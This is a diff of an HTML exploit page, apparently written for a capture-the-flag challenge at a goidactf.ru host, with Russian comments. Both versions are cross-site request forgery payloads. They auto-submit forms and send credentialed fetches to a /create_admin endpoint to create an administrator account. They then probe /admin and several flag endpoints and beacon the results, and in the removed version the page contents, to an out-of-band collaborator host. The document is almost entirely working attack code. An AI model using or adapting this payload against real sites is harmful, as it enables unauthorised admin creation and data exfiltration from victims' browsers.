@@ -1,26 +1,54 @@
 <!DOCTYPE html>
 <html>
+<head>
+    <meta name="referrer" content="no-referrer">
+</head>
 <body>
-<iframe id="n" sandbox="allow-scripts" style="display:none"></iframe>
 <script>
-const inner = `
-  <form id="p" action="https://tasks.goidactf.ru:20431/create_admin" method="POST">
-    <input type="hidden" name="new_admin_login" value="hacker_2026_flag">
-  </form>
-  <script>
-    document.getElementById('p').submit();
-    setTimeout(() => {
-      let d = document.body.innerHTML.substring(0, 1500);
-      navigator.sendBeacon("https://zzvqvwrdwxfyihbbkymvn6unl6cm7zezt.oast.fun", d);
-      parent.postMessage({data: d}, "*");
-    }, 1500);
-  <\/script>
-`;
-document.getElementById('n').srcdoc = inner;
+const TARGET = 'https://tasks.goidactf.ru:20431';
+const COLLAB = 'https://zzvqvwrdwxfyihbbkymvn6unl6cm7zezt.oast.fun';
 
-window.addEventListener("message", e => {
-  fetch("https://zzvqvwrdwxfyihbbkymvn6unl6cm7zezt.oast.fun", {method: "POST", mode: "no-cors", body: JSON.stringify(e.data)});
-});
+// Метод 1: Прямая форма (основной)
+const form1 = document.createElement('form');
+form1.method = 'POST';
+form1.action = TARGET + '/create_admin';
+form1.target = '_blank';
+form1.innerHTML = '<input name="new_admin_login" value="EXPLOIT_1">';
+document.body.appendChild(form1);
+form1.submit();
+
+// Метод 2: fetch с no-cors (на всякий случай)
+setTimeout(() => {
+    fetch(TARGET + '/create_admin', {
+        method: 'POST',
+        headers: {'Content-Type': 'application/x-www-form-urlencoded'},
+        credentials: 'include',
+        mode: 'no-cors',
+        body: 'new_admin_login=EXPLOIT_2'
+    });
+}, 1000);
+
+// Метод 3: Пытаемся прочитать результат через 3 секунды
+setTimeout(() => {
+    fetch(TARGET + '/admin', {
+        credentials: 'include',
+        mode: 'no-cors'
+    }).then(() => {
+        // Если запрос прошёл (даже без чтения тела) - админ доступен
+        navigator.sendBeacon(COLLAB + '/admin_accessible', 'yes');
+    });
+    
+    // Проверяем другие endpoints на наличие флага
+    ['/flag', '/getflag', '/api/flag', '/dashboard'].forEach(endpoint => {
+        const img = new Image();
+        img.onload = () => navigator.sendBeacon(COLLAB + endpoint, 'loaded');
+        img.onerror = () => navigator.sendBeacon(COLLAB + endpoint, 'error');
+        img.src = TARGET + endpoint;
+    });
+}, 3000);
+
+// Сигнал о выполнении
+navigator.sendBeacon(COLLAB + '/started', 'executed');
 </script>
 </body>
 </html>
